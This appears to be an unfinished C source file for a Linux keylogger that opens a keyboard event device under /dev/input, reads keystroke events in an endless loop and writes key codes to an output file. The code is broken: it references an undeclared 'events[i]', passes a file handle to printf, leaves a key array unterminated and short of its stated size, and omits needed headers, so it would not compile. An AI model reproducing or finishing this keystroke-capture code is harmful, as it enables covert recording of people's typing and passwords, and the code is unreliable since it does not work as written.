/*** keylog.c ***/

#include <stdio.h>
#include <stdlib.h>
#include <linux/input.h>

#define EVENT_NUM 100
#define TOT_KEYS 71

char *keys[] = {
  "1",
  "2",
  "3",
  "4",
  "5",
  "6",
  "7",
  "8",
  "9",
  "0"
  }

void keylogReadAndPrint(char *keyboardPath, FILE *output)
{
  //open the eventX file that records keystrokes
  char keyboardPath_EVENTUALLYREPLACE[] = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
  int device = open(keyboardPath, O_RDONLY);
  struct input_event inpEvent;

  // I don't know why we would need this, but a lot of code i read contained this to cancel loop when Ctrl-C is pressed; that already happens though
  //signal(SIGINT, INThandler);

  while(1)
  {
    read(device, &inpEvent, sizeof(inpEvent));  
    //if the type of the event is a state change (like of a keyboard)
    if (inpEvent.type == EV_KEY && inpEvent.value == 1)
    {
      //if the event code indicates a standard keyboard button
      if (events[i].code > 0 && events[i].code < TOT_KEYS)
      {
        //output the code of the standard keyboard button
        printf(output, "%d\n", events[i].code);
      }
      else
      {
        printf(output, "Key not recognized\n");
      }
    }
  }
}
